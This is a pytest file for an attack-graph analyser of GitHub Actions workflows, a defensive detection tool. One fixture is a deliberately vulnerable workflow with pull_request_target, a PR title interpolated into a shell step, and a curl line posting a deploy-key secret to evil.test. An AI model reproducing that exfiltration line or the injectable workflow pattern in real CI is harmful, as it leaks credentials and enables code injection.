"""Attack-graph tests: structure, evidence, path search, and export.

The soundness tests here exist because the first working version of the graph
invented routes: a shared ``ubuntu-latest`` runner node joined every job in the
repository, and a shared ``actions/checkout`` node let a path enter one
workflow and leave through another. Both produced confident, complete, entirely
fictional attack paths. The tests pin the fix.
"""

from __future__ import annotations

import json
from pathlib import Path

from supplytrace.cicd.evidence.collector import scan_repository
from supplytrace.cicd.graph.builder import build_graph
from supplytrace.cicd.graph.correlation import PathVerdict, find_attack_paths
from supplytrace.cicd.graph.export import export_all, graph_to_dict
from supplytrace.cicd.graph.models import EdgeType, NodeRole, NodeType

INJECTION_TO_SECRET = """\
on:
  pull_request_target:
    types: [opened]
permissions:
  contents: write
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - name: Build it
        env:
          TOKEN: ${{ secrets.DEPLOY_KEY }}
        run: |
          echo "building ${{ github.event.pull_request.title }}"
          npm install
          curl -X POST -d "t=$TOKEN" https://evil.test/collect
"""

TWO_WORKFLOWS_A = """\
on: push
permissions:
  contents: write
jobs:
  alpha:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: echo alpha
"""

TWO_WORKFLOWS_B = """\
on: push
permissions:
  packages: write
jobs:
  beta:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: echo beta
"""


def write(tmp_path: Path, name: str, source: str) -> None:
    directory = tmp_path / ".github" / "workflows"
    directory.mkdir(parents=True, exist_ok=True)
    (directory / name).write_text(source, encoding="utf-8")


def graph_for(tmp_path: Path, **workflows: str):
    for name, source in workflows.items():
        write(tmp_path, f"{name}.yml", source)
    result = scan_repository(tmp_path)
    return result, build_graph(result)


class TestGraphStructure:
    def test_workflow_job_step_hierarchy_exists(self, tmp_path) -> None:
        _, graph = graph_for(tmp_path, wf=INJECTION_TO_SECRET)
        assert graph.nodes_of_type(NodeType.WORKFLOW)
        assert graph.nodes_of_type(NodeType.JOB)
        assert graph.nodes_of_type(NodeType.STEP)
        assert graph.nodes_of_type(NodeType.RUNNER)

    def test_permissions_become_privilege_nodes(self, tmp_path) -> None:
        _, graph = graph_for(tmp_path, wf=INJECTION_TO_SECRET)
        labels = {n.label for n in graph.nodes_of_type(NodeType.PERMISSION)}
        assert "contents: write" in labels
        for node in graph.nodes_of_type(NodeType.PERMISSION):
            assert node.role is NodeRole.PRIVILEGE

    def test_every_security_edge_carries_evidence(self, tmp_path) -> None:
        """The invariant the whole report rests on."""

        _, graph = graph_for(tmp_path, wf=INJECTION_TO_SECRET)
        security_edges = [
            e
            for e in graph.edges
            if e.type
            in (
                EdgeType.INTERPOLATED_INTO,
                EdgeType.SENDS_TO,
                EdgeType.SUPPLIES,
            )
        ]
        assert security_edges
        for edge in security_edges:
            assert edge.evidence_ids, f"{edge.type} edge with no evidence"

    def test_an_unevidenced_security_edge_is_refused(self, tmp_path) -> None:
        _, graph = graph_for(tmp_path, wf=INJECTION_TO_SECRET)
        before = len(graph.edges)
        nodes = list(graph.nodes)
        added = graph.add_edge(nodes[0], nodes[1], EdgeType.SENDS_TO)
        assert added is False
        assert len(graph.edges) == before
        assert graph.rejected_edges

    def test_evidence_ids_resolve_to_real_findings(self, tmp_path) -> None:
        result, graph = graph_for(tmp_path, wf=INJECTION_TO_SECRET)
        known = {f.id for f in result.findings}
        for node in graph.nodes.values():
            assert set(node.evidence_ids) <= known
        for edge in graph.edges:
            assert set(edge.evidence_ids) <= known


class TestGraphSoundness:
    def test_runners_are_not_shared_between_jobs(self, tmp_path) -> None:
        """One node per `runs-on` label would join every job in the repo."""

        _, graph = graph_for(tmp_path, a=TWO_WORKFLOWS_A, b=TWO_WORKFLOWS_B)
        runners = graph.nodes_of_type(NodeType.RUNNER)
        assert len(runners) == 2
        assert len({r.id for r in runners}) == 2

    def test_actions_are_not_shared_between_call_sites(self, tmp_path) -> None:
        """A shared action node is a hub that bridges unrelated workflows."""

        _, graph = graph_for(tmp_path, a=TWO_WORKFLOWS_A, b=TWO_WORKFLOWS_B)
        checkouts = [
            n
            for n in graph.nodes_of_type(NodeType.ACTION)
            if n.attributes.get("repo") == "actions/checkout"
        ]
        assert len(checkouts) == 2

    def test_no_path_crosses_between_unrelated_workflows(self, tmp_path) -> None:
        """The regression that made three fictional attack paths look real."""

        _, graph = graph_for(tmp_path, a=TWO_WORKFLOWS_A, b=TWO_WORKFLOWS_B)
        for path in find_attack_paths(graph):
            files = {n.file for n in path.nodes if n.file}
            assert len(files) <= 1, f"{path.id} spans {files}"

    def test_github_token_is_modelled_once(self, tmp_path) -> None:
        _, graph = graph_for(tmp_path, wf=INJECTION_TO_SECRET)
        duplicates = [
            n for n in graph.nodes_of_type(NodeType.SECRET) if n.label == "GITHUB_TOKEN"
        ]
        assert duplicates == []


class TestAttackPaths:
    def test_untrusted_input_to_secret_path(self, tmp_path) -> None:
        """The chain the specification names: PR input -> execution -> secret -> network."""

        _, graph = graph_for(tmp_path, wf=INJECTION_TO_SECRET)
        paths = find_attack_paths(graph)
        assert paths, "expected at least one attack path"

        exfiltration = [
            p
            for p in paths
            if any(n.type is NodeType.EXTERNAL_HOST for n in p.nodes)
            and any(n.type is NodeType.SECRET for n in p.nodes)
        ]
        assert exfiltration, "no path connected a secret to an external host"

        path = exfiltration[0]
        roles = [n.role for n in path.nodes]
        assert NodeRole.EXECUTION in roles
        assert NodeRole.PRIVILEGE in roles
        assert roles[-1] is NodeRole.IMPACT
        assert path.nodes[-1].label == "evil.test"
        assert path.evidence_ids

    def test_untrusted_input_reaches_a_shell_command(self, tmp_path) -> None:
        _, graph = graph_for(tmp_path, wf=INJECTION_TO_SECRET)
        inputs = graph.nodes_of_type(NodeType.INPUT)
        assert inputs
        interpolations = [
            e for e in graph.edges if e.type is EdgeType.INTERPOLATED_INTO
        ]
        assert interpolations
        assert all(e.evidence_ids for e in interpolations)

    def test_paths_are_never_called_a_confirmed_attack(self, tmp_path) -> None:
        """A static read cannot establish that anyone exploited anything."""

        _, graph = graph_for(tmp_path, wf=INJECTION_TO_SECRET)
        for path in find_attack_paths(graph):
            assert path.verdict in (
                PathVerdict.POTENTIAL_ATTACK_PATH,
                PathVerdict.PARTIAL_PATH,
            )

    def test_every_path_records_what_it_could_not_establish(self, tmp_path) -> None:
        _, graph = graph_for(tmp_path, wf=INJECTION_TO_SECRET)
        for path in find_attack_paths(graph):
            assert path.missing

    def test_a_clean_workflow_produces_no_paths(self, tmp_path) -> None:
        clean = """\
on: push
permissions:
  contents: read
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@8f4b7f84864484a7bf31766abe9204da3cbe65b3
      - run: echo "build"
"""
        _, graph = graph_for(tmp_path, wf=clean)
        assert find_attack_paths(graph) == []

    def test_paths_are_not_duplicated_by_depth(self, tmp_path) -> None:
        """One weakness told to three depths is one path, not three."""

        _, graph = graph_for(tmp_path, wf=INJECTION_TO_SECRET)
        paths = find_attack_paths(graph)
        sequences = [tuple(n.id for n in p.nodes) for p in paths]
        for index, sequence in enumerate(sequences):
            for other_index, other in enumerate(sequences):
                if index == other_index:
                    continue
                assert other[: len(sequence)] != sequence, "a path is a prefix of another"


class TestExport:
    def test_json_export_round_trips_with_evidence(self, tmp_path) -> None:
        _, graph = graph_for(tmp_path, wf=INJECTION_TO_SECRET)
        paths = find_attack_paths(graph)
        payload = graph_to_dict(graph, paths)

        assert payload["summary"]["nodes"] == len(graph.nodes)
        assert payload["nodes"] and payload["edges"]
        assert payload["findings"]
        for node in payload["nodes"]:
            assert "evidence_ids" in node
        # Must survive serialisation.
        json.loads(json.dumps(payload, default=str))

    def test_export_all_writes_every_format(self, tmp_path) -> None:
        _, graph = graph_for(tmp_path, wf=INJECTION_TO_SECRET)
        out = tmp_path / "graph-out"
        written = export_all(graph, out, find_attack_paths(graph))

        assert (out / "attack_graph.json").is_file()
        assert (out / "attack_graph.dot").is_file()
        assert "graphml_error" not in written, written.get("graphml_error")
        assert (out / "attack_graph.graphml").is_file()

        dot = (out / "attack_graph.dot").read_text(encoding="utf-8")
        assert dot.startswith("digraph attack_graph {")
        assert dot.rstrip().endswith("}")
